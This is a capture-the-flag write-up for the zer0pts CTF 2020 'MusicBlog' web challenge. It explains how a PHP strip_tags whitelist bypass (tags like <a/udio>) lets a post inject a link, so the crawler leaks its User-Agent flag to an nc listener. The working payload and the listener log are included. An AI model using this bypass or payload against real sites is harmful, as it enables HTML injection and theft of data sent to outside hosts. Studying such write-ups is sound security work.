# [zer0pts CTF 2020] MusicBlog
###### tags: `zer0pts CTF`, `zer0pts CTF 2020`, `web`

## Solution
We're given source codes for database, app, and crawler. The location of flag can easily be found in `worker/worker.js`.

```javascript=
// (snipped)

const flag = 'zer0pts{<censored>}';

// (snipped)

const crawl = async (url) => {
    console.log(`[+] Query! (${url})`);
    const page = await browser.newPage();
    try {
        await page.setUserAgent(flag);
        await page.goto(url, {
            waitUntil: 'networkidle0',
            timeout: 10 * 1000,
        });
        await page.click('#like');
    } catch (err){
        console.log(err);
    }
    await page.close();
    console.log(`[+] Done! (${url})`)
};

// (snipped)
```

The flag is in `User-Agent` header. This means that you can get the flag if the crawler accesses websites you own. But how?

Hack the URL where the crawler accesses? As you can see from `new_post.php`, you can't.

```php=37
  if ($publish) {
    try {
      $redis = new Redis();
      $redis->connect("redis", 6379);
      $redis->rPush("query", $id);
    } catch (Exception $e) {
      print($e);
      exit(0);
    }
  }
```

XSS? As you can see from `post.php`, it seems that you can't use HTML tags other than `<audio>`.

```php=73
// post.php
          <div class="mt-3">
            <?= render_tags($post['content']) ?>
          </div>
```

```php=1
// util.php
// [[URL]] → <audio src="URL"></audio>
function render_tags($str) {
  $str = preg_replace('/\[\[(.+?)\]\]/', '<audio controls src="\\1"></audio>', $str);
  $str = strip_tags($str, '<audio>'); // only allows `<audio>`
  return $str;
}
```

But you can. As you can see from `Dockerfile` in `web`, the web server uses PHP 7.4.0. The latest version of PHP is now PHP 7.4.3, so it seems a bit old. Let's read [changelog of 7.4.0 → 7.4.1](https://www.php.net/ChangeLog-7.php#7.4.1).

> - Standard:
>   - Fixed bug #78814 (strip_tags allows / in tag name => whitelist bypass).

This app uses `strip_tags` for remove tags other than `<audio>`. Let's dig the [bug](https://bugs.php.net/bug.php?id=78814).

> **Bug #78814	strip_tags allows / in tag name, allowing whitelist bypass in browsers**
> 
> When strip_tags is used with a whitelist of tags, php allows slashes ("/") that occur inside the name of a whitelisted tag and copies them to the result.
> 
> For example, if &lt;strong&gt; is whitelisted, then a tag &lt;s/trong&gt; is also kept.

This means that in the app's case, `strip_tags` allows `<a/udio>`, which is interpreted as `<a>`.

So, with a payload like `[["></audio><a/udio href="(URL)" id="like">test</a/udio><audio a="]]`, you can bring the crawler to any URL.

```
$ nc -lvp 8000
Listening on [0.0.0.0] (family 0, port 8000)
Connection from ec2-3-112-201-75.ap-northeast-1.compute.amazonaws.com 33926 received!
GET / HTTP/1.1
︙
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: zer0pts{M4sh1m4fr3sh!!}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
︙
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```